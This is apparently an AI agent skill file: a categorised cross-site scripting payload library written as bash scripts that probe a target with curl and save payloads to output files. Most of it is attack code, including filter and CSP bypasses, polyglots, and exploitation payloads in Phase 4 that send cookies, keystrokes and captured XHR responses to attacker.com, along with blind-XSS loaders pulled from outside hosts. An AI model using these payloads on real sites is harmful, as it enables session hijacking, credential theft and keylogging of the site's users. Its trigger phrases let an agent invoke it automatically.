---
name: payload-xss
description: "XSS payload collection — reflected/stored/DOM, filter bypass, CSP bypass, polyglot, event handlers, SVG/HTML5, mXSS, blind XSS, cookie theft, keylogger payloads. Triggers: 'xss payload', 'cross site scripting payload', 'xss bypass', 'csp bypass payload', 'xss filter bypass', 'reflected xss payload', 'stored xss payload', 'dom xss payload', 'blind xss payload'."
---

# XSS Payloads

Comprehensive XSS payload library for all contexts and filter bypasses.

## Phase 1: Basic Detection Probes

```bash
TARGET="https://TARGET"
PARAM="q"

# Universal detection (check for reflection)
DETECT_PAYLOADS=(
  '<script>alert(1)</script>'
  '"><script>alert(1)</script>'
  "'><script>alert(1)</script>"
  '<img src=x onerror=alert(1)>'
  '"><img src=x onerror=alert(1)>'
  "javascript:alert(1)"
  '<svg onload=alert(1)>'
  '"><svg onload=alert(1)>'
  "';alert(1);//"
  '`-alert(1)-`'
  '</script><script>alert(1)</script>'
)

for payload in "${DETECT_PAYLOADS[@]}"; do
  encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")
  result=$(curl -s "$TARGET/?$PARAM=$encoded")
  echo "$result" | grep -q "$payload" && echo "REFLECTED: $payload"
done | tee /workspace/output/xss-reflected.txt
```

## Phase 2: Filter Bypass Payloads

```bash
# Case variation
CASE_BYPASS=(
  '<ScRiPt>alert(1)</sCrIpT>'
  '<SCRIPT>alert(1)</SCRIPT>'
  '<Script src=//evil.com/x.js>'
)

# Event handler variants
EVENT_BYPASS=(
  '<img src=x onerror=alert(1)>'
  '<img src=x onerror="alert(1)">'
  '<body onload=alert(1)>'
  '<input autofocus onfocus=alert(1)>'
  '<select autofocus onfocus=alert(1)>'
  '<video autoplay onloadstart=alert(1) src=x>'
  '<audio autoplay onloadstart=alert(1) src=x>'
  '<details open ontoggle=alert(1)>'
  '<marquee onstart=alert(1)>'
  '<object data=javascript:alert(1)>'
  '<embed src=javascript:alert(1)>'
  '<a href=javascript:alert(1)>click</a>'
  '<form><button formaction=javascript:alert(1)>click</button></form>'
)

# Encoding bypass
ENCODE_BYPASS=(
  '<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>'
  '<img src=x onerror=\x61\x6C\x65\x72\x74(1)>'
  '<script>alert(1)</script>'
  '<script>eval("\141\154\145\162\164\50\61\51")</script>'
  '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>'
)

echo "Filter bypass payloads" | tee /workspace/output/xss-bypass.txt
for p in "${EVENT_BYPASS[@]}" "${ENCODE_BYPASS[@]}"; do echo "$p"; done >> /workspace/output/xss-bypass.txt
```

## Phase 3: CSP Bypass Payloads

```bash
# JSONP CSP bypass (if allowlisted CDN has JSONP)
CSP_BYPASS=(
  # Whitelist bypass via allowed domain JSONP
  '<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>'
  '<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>'
  # Angular CSP bypass
  '<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js"></script><div ng-app ng-csp id=p ng-click=$event.view.alert(1)>click</div>'
  # base-uri bypass
  '<base href=//evil.com/>'
  # data: bypass (when data: allowed)
  '<script src=data:,alert(1)></script>'
  # Nonce bypass via unsafe-inline + DOM clobbering
  '<script>document.getElementById("app").innerHTML="<img src=x onerror=alert(1)>"</script>'
)

echo "CSP bypass payloads" | tee /workspace/output/xss-csp.txt
for p in "${CSP_BYPASS[@]}"; do echo "$p"; done >> /workspace/output/xss-csp.txt
```

## Phase 4: Exploitation Payloads

```bash
ATTACKER="https://attacker.com"

# Cookie theft
COOKIE_THEFT='<script>fetch("'"$ATTACKER"'/cookie?c="+document.cookie)</script>'
COOKIE_THEFT2='<img src=x onerror="fetch('"'"''"$ATTACKER"'/c?'"'"'+document.cookie)">'
COOKIE_THEFT3='<script>document.location="'"$ATTACKER"'/?"+document.cookie</script>'

# Keylogger
KEYLOGGER='<script>document.onkeypress=function(e){fetch("'"$ATTACKER"'/k?k="+e.key)}</script>'

# DOM-based credential capture
CRED_CAPTURE='<script>
var orig=XMLHttpRequest.prototype.open;
XMLHttpRequest.prototype.open=function(){
  var args=arguments;
  var self=this;
  this.addEventListener("load",function(){
    fetch("'"$ATTACKER"'/xhr",{method:"POST",body:JSON.stringify({url:args[1],resp:self.responseText})});
  });
  return orig.apply(this,args);
};
</script>'

# Blind XSS payloads (for admin panel injection)
BLIND_XSS=(
  "<script src=//xsshunter.com/xss.js></script>"
  '<script src=//YOUR.xss.ht></script>'
  '"><script src=//grabber.io/xss.js></script>'
  "<img src=x onerror=import('//attacker.com/x.js')>"
)

echo "Exploitation payloads generated" | tee /workspace/output/xss-exploit.txt
```

## Phase 5: Polyglot & SVG Payloads

```bash
# Universal XSS polyglot
POLYGLOT='jaVasCript:/*-/*`/*\`/*'"'"'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e'

# SVG payloads
SVG_PAYLOADS=(
  '<svg><script>alert(1)</script></svg>'
  '<svg onload=alert(1)>'
  '<svg><animate onbegin=alert(1) attributeName=x dur=1s>'
  '<svg><set onbegin=alert(1) attributeName=x>'
  '<svg><use href="data:image/svg+xml,<svg id=x xmlns=http://www.w3.org/2000/svg><circle onclick=alert(1)></circle></svg>#x">'
)

# HTML5 payloads
HTML5_PAYLOADS=(
  '<video><source onerror="alert(1)">'
  '<track default onload="alert(1)">'
  '<math><mtext><table><mglyph><style><malignmark><img src onerror=alert(1)>'
)

# mXSS (mutation XSS)
MXSS=(
  '<listing>&lt;img src=x onerror=alert(1)&gt;</listing>'
  '<noscript><p title="</noscript><img src=x onerror=alert(1)>">'
  '<svg><altglyph/onload=alert(1)>'
)

echo "Polyglot and SVG payloads" | tee /workspace/output/xss-polyglot.txt
echo "$POLYGLOT" >> /workspace/output/xss-polyglot.txt
for p in "${SVG_PAYLOADS[@]}" "${HTML5_PAYLOADS[@]}" "${MXSS[@]}"; do echo "$p"; done >> /workspace/output/xss-polyglot.txt
```

## Output

Save to `/workspace/output/`:
- `xss-reflected.txt` — confirmed reflection points
- `xss-bypass.txt` — filter bypass payloads
- `xss-csp.txt` — CSP bypass payloads
- `xss-exploit.txt` — exploitation payloads
- `xss-polyglot.txt` — polyglot/SVG payloads

## Next Phase

→ `vuln-xss` for full XSS exploitation methodology
→ `vuln-cors` if XSS + CORS combination needed
